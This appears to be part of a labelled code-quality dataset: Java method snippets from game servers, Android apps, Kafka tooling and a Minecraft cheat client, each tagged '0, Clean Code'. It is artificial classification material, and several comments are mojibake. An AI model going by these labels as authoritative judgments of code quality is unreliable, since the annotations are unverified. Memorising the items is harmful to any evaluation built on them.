  throw exceptionBuilder().evalError(""methodNotDefined4"",getQualifiedMemberName(),VmUtils.getClass(arg1),VmUtils.getClass(arg2),VmUtils.getClass(arg3),VmUtils.getClass(arg4)).withProgramValue(""Argument 1"",arg1).withProgramValue(""Argument 2"",arg2).withProgramValue(""Argument 3"",arg3).withProgramValue(""Argument 4"",arg4).build();
}",0,Clean Code
"/** 
 * <code>optional uint32 equip_avatar_id = 1;</code>
 * @return the equipAvatarId
 */
public int getEquipAvatarId(){
  return equipAvatarId;
}",0,Clean Code
"public GGProAppChnnPreInfo(GProAppChnnPreInfo gProAppChnnPreInfo){
  this.mInfo=gProAppChnnPreInfo;
}
",0,Clean Code
"@Override public Prompt create(){
  List<Message> messages=createMessages();
  return new Prompt(messages);
}
@Override public Prompt create(Map<String,Object> model){
  List<Message> messages=createMessages(model);
  return new Prompt(messages);
}
",0,Clean Code
"/** 
 * Token 鏂瑰紡骞傜瓑瀹炵幇锛屽熀浜� RestAPI 鍦烘櫙
 */
@Bean @ConditionalOnMissingBean public IdempotentTokenService idempotentTokenExecuteHandler(DistributedCache distributedCache,IdempotentProperties idempotentProperties){
  return new IdempotentTokenExecuteHandler(distributedCache,idempotentProperties);
}
",0,Clean Code
"/** 
 * <code>optional uint32 buff_aeon_id = 2;</code>
 * @return this
 */
public StartRogueCsReq clearBuffAeonId(){
  bitField0_&=~0x00000001;
  buffAeonId=0;
  return this;
}",0,Clean Code
"@Override public void endArray(@Nullable EconomicMap<Object,ObjectMember> members){
  assert members != null;
  value=new VmListing(VmUtils.createEmptyMaterializedFrame(),BaseModule.getListingClass().getPrototype(),members,EconomicMaps.size(members));
  currPath.pop();
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 10;</code>
 * @return this
 */
public SetAssistAvatarScRsp clearRetcode(){
  bitField0_&=~0x00000002;
  retcode=0;
  return this;
}",0,Clean Code
"@Override public String lpop(String key){
  return executeInJedis(jedis -> jedis.lpop(key));
}
",0,Clean Code
"public long getMark(){
  return this.mark;
}
",0,Clean Code
"@Override public FriendRecommendInfo mergeFrom(final FriendRecommendInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasSimpleInfo()) {
    getMutableSimpleInfo().mergeFrom(other.simpleInfo);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@538132a8!org.eclipse.jdt.core.dom.MethodDeclaration@135d950",0,Clean Code
"/** 
 * <pre> LCMLACLKNDI HFBFDNEMJED = 6; </pre> <code>optional uint32 cell_room_id = 15;</code>
 * @return the cellRoomId
 */
public int getCellRoomId(){
  return cellRoomId;
}",0,Clean Code
"public BigNumberSerializer(Class<? extends Number> rawType){
  super(rawType);
}
",0,Clean Code
"/** 
 * Convert the ChatCompletionChunk into a ChatCompletion. The Usage is set to null.
 * @param chunk the ChatCompletionChunk to convert
 * @return the ChatCompletion
 */
private ZhiPuAiApi.ChatCompletion chunkToChatCompletion(ZhiPuAiApi.ChatCompletionChunk chunk){
  List<Choice> choices=chunk.choices().stream().map(cc -> new Choice(cc.finishReason(),cc.index(),cc.delta(),cc.logprobs())).toList();
  return new ZhiPuAiApi.ChatCompletion(chunk.id(),choices,chunk.created(),chunk.model(),chunk.systemFingerprint(),""chat.completion"",null);
}
",0,Clean Code
"ArrayList<GProGuild> getGuildListFromCache();
",0,Clean Code
"public Object getVariables(){
  return variables;
}
",0,Clean Code
"public List<GameItem> takePromotionRewardAvatar(Player player,int avatarId,int promotion){
  GameAvatar avatar=player.getAvatarById(avatarId);
  if (avatar == null) {
    return null;
  }
  if (promotion <= 0 || promotion > avatar.getPromotion()) {
    return null;
  }
  if (promotion % 2 == 0 || avatar.hasTakenReward(promotion)) {
    return null;
  }
  avatar.takeReward(promotion);
  avatar.save();
  List<GameItem> rewards=new ArrayList<>();
  rewards.add(new GameItem(101,1));
  player.getInventory().addItems(rewards);
  player.sendPacket(new PacketPlayerSyncScNotify(avatar));
  return rewards;
}",0,Clean Code
"/** 
 * Converts the given color to a String in HSL format.
 */
public static String toHSL(Color color){
  if (color == null)   return """";
  double[] rgb=colorToArray(color);
  double r=rgb[0];
  double g=rgb[1];
  double b=rgb[2];
  double min=Math.min(r,Math.min(g,b));
  double max=Math.max(r,Math.max(g,b));
  double h=0;
  if (max == min) {
    h=0;
  }
 else   if (max == r) {
    h=((60 * (g - b) / (max - min)) + 360) % 360;
  }
 else   if (max == g) {
    h=(60 * (b - r) / (max - min)) + 120;
  }
 else   if (max == b) {
    h=(60 * (r - g) / (max - min)) + 240;
  }
  double l=(max + min) / 2;
  double s=0;
  if (max == min) {
    s=0;
  }
 else   if (l <= 0.5f) {
    s=(max - min) / (max + min);
  }
 else {
    s=(max - min) / (2 - max - min);
  }
  return ""hsl("" + Math.round(h) + ""deg, ""+ Math.round(s * 100)+ ""%, ""+ Math.round(l * 100)+ ""%)"";
}",0,Clean Code
"private CharSequence networkStatOf(String variable){
  long traffic=0;
  Integer textColor=null;
  variable=variable.toLowerCase();
  CharSequence transformed=null;
  try {
switch (variable) {
case ""crx"":
case ""rx"":
      textColor=RXColor;
    traffic=getTrafficStats(TYPE_RX,!variable.startsWith(""c""));
  break;
case ""ctx"":
case ""tx"":
textColor=TXColor;
traffic=getTrafficStats(TYPE_TX,!variable.startsWith(""c""));
break;
case ""call"":
case ""all"":
traffic=getTrafficStats(TYPE_RX | TYPE_TX,!variable.startsWith(""c""));
break;
case ""ssid"":
transformed=fetchCurrentWifiSSID();
hasSSID=true;
break;
}
if (transformed == null) {
transformed=ObjectTools.getHumanizedBytes(traffic,false,.6f,"""","""",textColor);
}
return transformed;
}
 catch (Exception ignored) {
return ""$N"" + variable;
}
}",0,Clean Code
"@Override public String getUriScheme(){
  return ""http"";
}
",0,Clean Code
"private void createApplyButton(int y){
  JButton applyButton=new JButton(""Apply"");
  applyButton.addActionListener(e -> applySettings());
  applyButton.setBackground(UIManager.getColor(""Burp.burpOrange""));
  applyButton.setForeground(Color.WHITE);
  applyButton.setFont(applyButton.getFont().deriveFont(Font.BOLD));
  add(applyButton,createGridBagConstraints(1,y));
}",0,Clean Code
"public void setReferenceName(String referenceName){
  this.referenceName=referenceName;
}
",0,Clean Code
"/** 
 * @return the timeoutSeconds
 */
public long getTimeoutSeconds(){
  return timeoutSeconds;
}
",0,Clean Code
"@Override public FarmStageGachaInfo copyFrom(final FarmStageGachaInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    beginTime=other.beginTime;
    endTime=other.endTime;
    gachaId=other.gachaId;
  }
  return this;
}",0,Clean Code
"@Override public GroupStateChangeCsReq clone(){
  return new GroupStateChangeCsReq().copyFrom(this);
}
",0,Clean Code
"/** 
 * Constructor for iterator based on the size
 */
public NodesIterator(int size){
  this.size=size;
}
",0,Clean Code
"/** 
 * Function descriptor for: {@snippet lang=c : void calculate_partial_sums_best_euclidean_f32_512(const float *codebook, int codebookBase, int size, int clusterCount, const float *query, int queryOffset, float *partialSums, float *partialBestDistances)
 */
public static FunctionDescriptor calculate_partial_sums_best_euclidean_f32_512$descriptor(){
  return calculate_partial_sums_best_euclidean_f32_512.DESC;
}",0,Clean Code
"/** 
 * <code>optional bool is_virtual = 8;</code>
 * @return the isVirtual
 */
public boolean getIsVirtual(){
  return isVirtual;
}",0,Clean Code
"private void doBeginArray(){
  builder.append(""["");
  increaseIndent();
}
",0,Clean Code
"public IShop(){
}
public IShop(String iShopId,JSONObject jsonObject){
  this.iShopId=iShopId;
  this.provinceName=jsonObject.getString(""provinceName"");
  this.cityName=jsonObject.getString(""cityName"");
  this.districtName=jsonObject.getString(""districtName"");
  this.fullAddress=jsonObject.getString(""fullAddress"");
  this.lat=jsonObject.getString(""lat"");
  this.lng=jsonObject.getString(""lng"");
  this.name=jsonObject.getString(""name"");
  this.tenantName=jsonObject.getString(""tenantName"");
  this.createTime=new Date();
}
",0,Clean Code
"List<IGProChannelInfo> getSpecificTypeChannelList(String str,int i2);",0,Clean Code
"/** 
 * 鑾峰彇鏈嶅姟鍣ㄥ惎鍔ㄦ椂闂�
 */
public static Date getServerStartDate(){
  long time=ManagementFactory.getRuntimeMXBean().getStartTime();
  return new Date(time);
}
",0,Clean Code
"public static float atan(float value){
  return (float)Math.atan(value);
}
",0,Clean Code
"@Override public String getFormat(){
  return null;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RankUpEquipmentCsReq)) {
    return false;
  }
  RankUpEquipmentCsReq other=(RankUpEquipmentCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasEquipmentUniqueId() || equipmentUniqueId == other.equipmentUniqueId) && (!hasItemCostList() || itemCostList.equals(other.itemCostList));
}",0,Clean Code
"@Specialization protected VmList eval(VmList self,VmFunction function){
  var builder=self.builder();
  for (  var elem : self) {
    var newValue=applyLambdaNode.execute(function,elem);
    if (newValue instanceof VmNull)     continue;
    builder.add(newValue);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
@Specialization protected VmSet eval(VmSet self,VmFunction function){
  var builder=self.builder();
  for (  var elem : self) {
    var newValue=applyLambdaNode.execute(function,elem);
    if (newValue instanceof VmNull)     continue;
    builder.add(newValue);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
",0,Clean Code
"public static List<KafkaTopicDefaultConfig> convert2KafkaTopicDefaultConfigList(List<Properties> configNameAndDocList,Map<String,String> defaultValueMap){
  List<KafkaTopicDefaultConfig> configList=new ArrayList<>();
  for (  Properties nameAndDocProp : configNameAndDocList) {
    String configName=nameAndDocProp.getProperty(AbstractTopicConfig.KAFKA_CONFIG_KEY_NAME);
    if (ValidateUtils.isBlank(configName)) {
      continue;
    }
    KafkaTopicDefaultConfig config=new KafkaTopicDefaultConfig();
    config.setName(configName);
    config.setDocumentation(nameAndDocProp.getProperty(AbstractTopicConfig.KAFKA_CONFIG_DOC_NAME));
    ConfigDef.ConfigKey configKey=KafkaConstant.KAFKA_ALL_CONFIG_DEF_MAP.get(configName);
    if (configKey != null) {
      config.setConfigType(configKey.type.ordinal());
    }
 else {
      config.setConfigType(null);
    }
    config.setDefaultValue(defaultValueMap.getOrDefault(configName,defaultValueMap.getOrDefault(""log."" + configName,null)));
    if (configName.equals(TopicConfig0100.RETENTION_MS_CONFIG)) {
      if (defaultValueMap.containsKey(KafkaConfig.LogRetentionTimeMillisProp())) {
        config.setDefaultValue(defaultValueMap.get(KafkaConfig.LogRetentionTimeMillisProp()));
      }
 else       if (defaultValueMap.containsKey(KafkaConfig.LogRetentionTimeMinutesProp())) {
        Long val=ConvertUtil.string2Long(defaultValueMap.get(KafkaConfig.LogRetentionTimeMinutesProp()));
        if (val != null && val.equals(-1L)) {
          config.setDefaultValue(""-1"");
        }
 else         if (val != null) {
          config.setDefaultValue(String.valueOf(val * 60L * 1000L));
        }
      }
 else       if (defaultValueMap.containsKey(KafkaConfig.LogRetentionTimeHoursProp())) {
        Long val=ConvertUtil.string2Long(defaultValueMap.get(KafkaConfig.LogRetentionTimeHoursProp()));
        if (val != null && val.equals(-1L)) {
          config.setDefaultValue(""-1"");
        }
 else         if (val != null) {
          config.setDefaultValue(String.valueOf(val * 60L * 60L* 1000L));
        }
      }
 else {
        config.setDefaultValue(null);
      }
    }
    config.setReadOnly(false);
    configList.add(config);
  }
  return configList;
}",0,Clean Code
"/** 
 * @return Returns the input keys
 */
public List<String> getInputKeys(){
  return inputKeys;
}
",0,Clean Code
"public Preference createPreference(OptionCategory category){
switch (category.type) {
case OptionCategory.TYPE_CHECKBOX_LIST:
    return createCheckedListPreference(category);
case OptionCategory.TYPE_RADIO_LIST:
  return createRadioListPreference(category);
case OptionCategory.TYPE_STRING_LIST:
return createStringListPreference(category);
case OptionCategory.TYPE_SINGLE_SWITCH:
return createSwitchPreference(category);
case OptionCategory.TYPE_SINGLE_BUTTON:
return createButtonPreference(category);
case OptionCategory.TYPE_LONG_TEXT:
return createLongTextPreference(category);
case OptionCategory.TYPE_CHAT:
return createChatPreference(category);
case OptionCategory.TYPE_COMMENTS:
return createCommentsPreference(category);
}
throw new IllegalStateException(""Can't find matched preference for type: "" + category.type);
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent event){
  EntityView selectedEntity=delegate.onSelectedEntityRequest();
  if (selectedEntity == null) {
    return false;
  }
  if (event.getPointerCount() == 1) {
    int action=event.getActionMasked();
    if (action == MotionEvent.ACTION_DOWN) {
      hasTransformed=false;
      selectedEntity.hasPanned=false;
      selectedEntity.hasReleased=false;
      px=event.getX();
      py=event.getY();
      cancelled=false;
    }
 else     if (!cancelled && action == MotionEvent.ACTION_MOVE) {
      final float x=event.getX();
      final float y=event.getY();
      if (hasTransformed || MathUtils.distance(x,y,px,py) > AndroidUtilities.touchSlop) {
        hasTransformed=true;
        selectedEntity.hasPanned=true;
        selectedEntity.pan(x - px,y - py);
        px=x;
        py=y;
      }
    }
 else     if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
      selectedEntity.hasPanned=false;
      selectedEntity.hasReleased=true;
      if (!hasTransformed && delegate != null) {
        delegate.onEntityDeselect();
      }
      invalidate();
      return false;
    }
  }
 else {
    selectedEntity.hasPanned=false;
    selectedEntity.hasReleased=true;
    hasTransformed=false;
    cancelled=true;
    invalidate();
  }
  return true;
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SyncRogueFinishScNotify)) {
    return false;
  }
  SyncRogueFinishScNotify other=(SyncRogueFinishScNotify)o;
  return bitField0_ == other.bitField0_ && (!hasFinishInfo() || finishInfo.equals(other.finishInfo));
}",0,Clean Code
"@Override public Object convertListing(VmListing value,Iterable<Object> path){
  return doConvert(value,path,listingConverter);
}
",0,Clean Code
"public void releaseAllPointersOlderThan(final Element pointer,final long eventTime){
synchronized (mExpandableArrayOfActivePointers) {
    if (DEBUG) {
      Log.d(TAG,""releaseAllPointerOlderThan: "" + pointer + "" ""+ this);
    }
    final ArrayList<Element> expandableArray=mExpandableArrayOfActivePointers;
    final int arraySize=mArraySize;
    int newIndex, index;
    for (newIndex=index=0; index < arraySize; index++) {
      final Element element=expandableArray.get(index);
      if (element == pointer) {
        break;
      }
      if (!element.isModifier()) {
        element.onPhantomUpEvent(eventTime);
        continue;
      }
      if (newIndex != index) {
        expandableArray.set(newIndex,element);
      }
      newIndex++;
    }
    int count=0;
    for (; index < arraySize; index++) {
      final Element element=expandableArray.get(index);
      if (element == pointer) {
        count++;
        if (count > 1) {
          Log.w(TAG,""Found duplicated element in releaseAllPointersOlderThan: "" + pointer);
        }
      }
      if (newIndex != index) {
        expandableArray.set(newIndex,expandableArray.get(index));
      }
      newIndex++;
    }
    mArraySize=newIndex;
  }
}",0,Clean Code
"public String getServantName(){
  return null;
}
",0,Clean Code
"public String toString(){
  return ""GProAudioLiveUserListReq{guildId="" + this.guildId + "",channelId=""+ this.channelId+ "",onceGetNum=""+ this.onceGetNum+ "",needChannelState=""+ this.needChannelState+ "",onlyHandUpList=""+ this.onlyHandUpList+ "",onlySpeakOrderList=""+ this.onlySpeakOrderList+ "",numIndex=""+ this.numIndex+ "",}"";
}
",0,Clean Code
"/** 
 * <code>optional uint32 mismatch_turn_count = 15;</code>
 * @param value the mismatchTurnCount to set
 * @return this
 */
public PVEBattleResultScRsp setMismatchTurnCount(final int value){
  bitField0_|=0x00000010;
  mismatchTurnCount=value;
  return this;
}",0,Clean Code
"@Override public Iterator<String> iterator(){
  return data.iterator();
}
",0,Clean Code
"@Override public EnteredSceneInfo mergeFrom(final EnteredSceneInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasPlaneId()) {
    setPlaneId(other.planeId);
  }
  if (other.hasFloorId()) {
    setFloorId(other.floorId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5147f2c6!org.eclipse.jdt.core.dom.MethodDeclaration@3f3283ca",0,Clean Code
"@Override public void run(){
  try {
    WorkflowModel workflowModel=executionDAO.getWorkflow(workflowId,false);
    indexDAO.asyncIndexWorkflow(new WorkflowSummary(workflowModel.toWorkflow()));
  }
 catch (  Exception e) {
    LOGGER.error(""Unable to update workflow: {}"",workflowId,e);
  }
}
",0,Clean Code
"public static H2Select generateSelect(H2GlobalState globalState,int nrColumns){
  H2Tables targetTables=globalState.getSchema().getRandomTableNonEmptyTables();
  H2ExpressionGenerator gen=new H2ExpressionGenerator(globalState).setColumns(targetTables.getColumns());
  H2Select select=new H2Select();
  List<Node<H2Expression>> columns=new ArrayList<>();
  for (int i=0; i < nrColumns; i++) {
    Node<H2Expression> expression=gen.generateExpression();
    columns.add(expression);
  }
  select.setFetchColumns(columns);
  List<H2Table> tables=targetTables.getTables();
  List<TableReferenceNode<H2Expression,H2Table>> tableList=tables.stream().map(t -> new TableReferenceNode<H2Expression,H2Table>(t)).collect(Collectors.toList());
  List<Node<H2Expression>> joins=H2Join.getJoins(tableList,globalState);
  select.setJoinList(joins.stream().collect(Collectors.toList()));
  select.setFromList(tableList.stream().collect(Collectors.toList()));
  if (Randomly.getBoolean()) {
    select.setWhereClause(gen.generateExpression());
  }
  if (Randomly.getBoolean()) {
    select.setOrderByClauses(gen.generateOrderBys());
  }
  if (Randomly.getBoolean()) {
    select.setGroupByExpressions(gen.generateExpressions(Randomly.smallNumber() + 1));
  }
  if (Randomly.getBoolean()) {
    select.setLimitClause(H2Constant.createIntConstant(Randomly.getNotCachedInteger(0,Integer.MAX_VALUE)));
  }
  if (Randomly.getBoolean()) {
    select.setOffsetClause(H2Constant.createIntConstant(Randomly.getNotCachedInteger(0,Integer.MAX_VALUE)));
  }
  if (Randomly.getBoolean()) {
    select.setHavingClause(gen.generateHavingClause());
  }
  return select;
}",0,Clean Code
"@Override protected void endMap(VmMap value){
}
",0,Clean Code
"/** 
 * <code>optional uint32 arg_id = 14;</code>
 * @return this
 */
public RogueDialogueEventParam clearArgId(){
  bitField0_&=~0x00000004;
  argId=0;
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 client_pos_version = 6;</code>
 * @return this
 */
public SceneInfo clearClientPosVersion(){
  bitField0_&=~0x00000008;
  clientPosVersion=0;
  return this;
}",0,Clean Code
"private void doBreak(){
  if (!doBreak.get() || breakTimer > 0 || switchTimer > 0 || attacks >= attackFrequency.get())   return;
  if (shouldPause(PauseMode.Break))   return;
  float bestDamage=0;
  Entity crystal=null;
  for (  Entity entity : mc.world.getEntities()) {
    float damage=getBreakDamage(entity,true);
    if (damage > bestDamage) {
      bestDamage=damage;
      crystal=entity;
    }
  }
  if (crystal != null)   doBreak(crystal);
}
private void doBreak(Entity crystal){
  if (antiWeakness.get()) {
    StatusEffectInstance weakness=mc.player.getStatusEffect(StatusEffects.WEAKNESS);
    StatusEffectInstance strength=mc.player.getStatusEffect(StatusEffects.STRENGTH);
    if (weakness != null && (strength == null || strength.getAmplifier() <= weakness.getAmplifier())) {
      if (!isValidWeaknessItem(mc.player.getMainHandStack())) {
        if (!InvUtils.swap(InvUtils.findInHotbar(this::isValidWeaknessItem).slot(),false))         return;
        switchTimer=1;
        return;
      }
    }
  }
  boolean attacked=true;
  if (rotate.get()) {
    double yaw=Rotations.getYaw(crystal);
    double pitch=Rotations.getPitch(crystal,Target.Feet);
    if (doYawSteps(yaw,pitch)) {
      setRotation(true,crystal.getPos(),0,0);
      Rotations.rotate(yaw,pitch,50,() -> attackCrystal(crystal));
      breakTimer=breakDelay.get();
    }
 else {
      attacked=false;
    }
  }
 else {
    attackCrystal(crystal);
    breakTimer=breakDelay.get();
  }
  if (attacked) {
    removed.add(crystal.getId());
    attemptedBreaks.put(crystal.getId(),attemptedBreaks.get(crystal.getId()) + 1);
    waitingToExplode.put(crystal.getId(),0);
    breakRenderPos.set(crystal.getBlockPos().down());
    breakRenderTimer=breakRenderTime.get();
  }
}",0,Clean Code
"@Override protected void dispatchDraw(Canvas canvas){
  if (counterView != null) {
    counterOffset.set((counterView.counterDrawable.getWidth() * 0.85f + AndroidUtilities.dp(3)) / 2f);
    counterOffset2.set(getMeasuredWidth() / 2f + (overlayTextView.getDrawable().getWidth()) / 2f + AndroidUtilities.dp(3));
    overlayTextView.setTranslationX(-counterOffset.get());
    counterView.setTranslationX(counterOffset2.get() - counterOffset.get());
  }
 else {
    if (overlayTextView != null) {
      overlayTextView.setTranslationX(0);
    }
  }
  AndroidUtilities.rectTmp.set(0,0,getMeasuredWidth(),getMeasuredHeight());
  if (overlayProgress != 1f || !drawOverlayColor) {
    if (inc) {
      progress+=16f / 1000f;
      if (progress > 3) {
        inc=false;
      }
    }
 else {
      progress-=16f / 1000f;
      if (progress < 1) {
        inc=true;
      }
    }
    if (drawGradient) {
      PremiumGradient.getInstance().updateMainGradientMatrix(0,0,getMeasuredWidth(),getMeasuredHeight(),-getMeasuredWidth() * 0.1f * progress,0);
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,PremiumGradient.getInstance().getMainGradientPaint());
    }
 else {
      paintOverlayPaint.setAlpha(255);
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
    }
    invalidate();
  }
  if (!BuildVars.IS_BILLING_UNAVAILABLE && !isFlickerDisabled) {
    flickerDrawable.setParentWidth(getMeasuredWidth());
    flickerDrawable.draw(canvas,AndroidUtilities.rectTmp,radius,null);
  }
  if (overlayProgress != 0 && drawOverlayColor) {
    paintOverlayPaint.setAlpha((int)(255 * overlayProgress));
    if (overlayProgress != 1f) {
      path.rewind();
      path.addCircle(getMeasuredWidth() / 2f,getMeasuredHeight() / 2f,Math.max(getMeasuredWidth(),getMeasuredHeight()) * 1.4f * overlayProgress,Path.Direction.CW);
      canvas.save();
      canvas.clipPath(path);
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
      canvas.restore();
    }
 else {
      canvas.drawRoundRect(AndroidUtilities.rectTmp,radius,radius,paintOverlayPaint);
    }
  }
  super.dispatchDraw(canvas);
}",0,Clean Code
"@Test void test_system_message_configuration_16(){
  AiService aiService=AiServices.builder(AiService.class).chatLanguageModel(chatLanguageModel).systemMessageProvider(chatMemoryId -> ""Given a name of a country, answer with a name of it's capital"").build();
  assertThat(aiService.chat16()).containsIgnoringCase(""Berlin"");
  verify(chatLanguageModel).generate(asList(systemMessage(""Given a name of a country, answer with a name of it's capital""),userMessage(""Country: Germany"")));
}",0,Clean Code
"public abstract void onPause();
",0,Clean Code
"@Override public ExpressionCategoryEnum getType(){
  return ExpressionCategoryEnum.DIGIT;
}
",0,Clean Code
"public static void registerDefaultSerializers(Fury fury){
  fury.registerSerializer(HashMap.class,new HashMapSerializer(fury));
  fury.getClassResolver().registerSerializer(LinkedHashMap.class,new LinkedHashMapSerializer(fury));
  fury.registerSerializer(TreeMap.class,new SortedMapSerializer<>(fury,TreeMap.class));
  fury.registerSerializer(Collections.EMPTY_MAP.getClass(),new EmptyMapSerializer(fury,(Class<Map<?,?>>)Collections.EMPTY_MAP.getClass()));
  fury.registerSerializer(Collections.emptySortedMap().getClass(),new EmptySortedMapSerializer(fury,(Class<SortedMap<?,?>>)Collections.emptySortedMap().getClass()));
  fury.registerSerializer(Collections.singletonMap(null,null).getClass(),new SingletonMapSerializer(fury,(Class<Map<?,?>>)Collections.singletonMap(null,null).getClass()));
  fury.registerSerializer(ConcurrentHashMap.class,new ConcurrentHashMapSerializer(fury,ConcurrentHashMap.class));
  fury.registerSerializer(ConcurrentSkipListMap.class,new ConcurrentSkipListMapSerializer(fury,ConcurrentSkipListMap.class));
  fury.registerSerializer(EnumMap.class,new EnumMapSerializer(fury));
  fury.registerSerializer(LazyMap.class,new LazyMapSerializer(fury));
}
",0,Clean Code
"/** 
 * <code>optional uint32 trigger_entity_id = 11;</code>
 * @return this
 */
public RefreshTriggerByClientCsReq clearTriggerEntityId(){
  bitField0_&=~0x00000001;
  triggerEntityId=0;
  return this;
}",0,Clean Code
"@Override public RogueBonusSelect clone(){
  return new RogueBonusSelect().copyFrom(this);
}
",0,Clean Code
"public void setIndexName(String indexName){
  this.indexName=indexName;
}
",0,Clean Code
